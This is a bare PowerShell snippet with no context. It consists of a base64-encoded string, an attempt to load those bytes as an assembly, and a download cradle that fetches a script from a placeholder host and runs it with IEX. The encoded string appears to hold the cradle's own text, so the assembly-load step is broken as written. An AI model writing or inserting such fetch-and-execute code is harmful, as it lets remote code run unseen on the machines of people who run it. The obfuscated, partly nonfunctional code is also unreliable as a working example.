$b64 = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes)
IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/b')
